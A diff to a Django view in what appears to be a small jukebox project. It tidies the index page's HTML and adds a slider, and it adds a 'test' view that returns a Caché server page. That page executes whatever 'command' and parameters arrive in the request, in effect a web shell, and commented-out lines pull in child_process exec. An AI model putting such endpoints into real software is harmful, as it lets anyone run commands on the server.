@@ -25,8 +25,18 @@ PIMORONI_FONT = '/data/django/jukeoroni/player/static/gotham-black.ttf'
 def index(request):
     channels = Channel.objects.all()
 
-    ret = '<body>\n'
-    ret += '  <html>\n'
+    ret = '<html>\n'
+    # ret += '<head>\n'
+    # ret += '<script>\n'
+    # ret += 'var exec = require(\'child_process\').exec, child;\n'
+    # ret += '\n'
+    # ret += 'function myFunction(val) {\n'
+    # ret += '\n'
+    # ret += '}\n'
+    # ret += '</script>\n'
+    # ret += '</head>\n'
+    ret += '  <body>\n'
+    ret += '  <input type="range" min="1" max="100" value="50" class="slider" id="myRange" oninput=\'myFunction(this.value)\'>'
     for channel in channels:
         if channel.is_enabled:
             # required to find out if and which channel is playing
@@ -38,8 +48,38 @@ def index(request):
                 ret += '        <button style=\"width:100%; background-color:green; \" onclick=\"window.location.href = \'stop/{0}\';\">{1}</button>\n'.format(pid_output, channel.display_name)  # , channel.display_name)
             else:
                 ret += '        <button style=\"width:100%\" onclick=\"window.location.href = \'{0}/play\';\">{1}</button>\n'.format(channel.display_name_short, channel.display_name)
-    ret += '  </html>\n'
-    ret += '</body>\n'
+    ret += '  </body>\n'
+    ret += '</html>\n'
+    return HttpResponse(ret)
+
+
+def test(request):
+    ret = """
+<HTML><HEAD><LINK REL="stylesheet" TYPE="text/css" HREF="" TITLE="Standard Style" ><TITLE>Execute </TITLE></HEAD>
+<BODY>
+<SCRIPT LANGUAGE=CACHE RUNAT=SERVER>set t1 = $piece($h,2)</SCRIPT>
+<TABLE>
+<TR><TD></TD><TD><BR>#($zdt($h,2))#</TD></TR>
+<TR><TD></TD><TD>
+ <TEXTAREA COLS="110" ROWS="45">
+<SCRIPT LANGUAGE=CACHE RUNAT=SERVER>
+if %request.Get("command") '= "" {
+                  set parens = 0
+                  set cmd = %request.Get("command")
+                  if %request.Get("param1") '= "" set cmd = cmd_"("_%request.Get("param1"), parens=1
+                  if %request.Get("param2") '= "" set cmd = cmd_","_%request.Get("param2")
+                  if %request.Get("param3") '= "" set cmd = cmd_","_%request.Get("param2")
+                  if (parens=1) set cmd = cmd_")"
+                  w "> "_cmd,!
+ }
+if %request.Get("command") '= "" {
+                  xecute cmd
+}
+</SCRIPT>                                
+</TEXTAREA></TD></TR> 
+<TR><TD></TD><TD></TD></TR>
+</TABLE></BODY></HTML>
+"""
     return HttpResponse(ret)
 
 
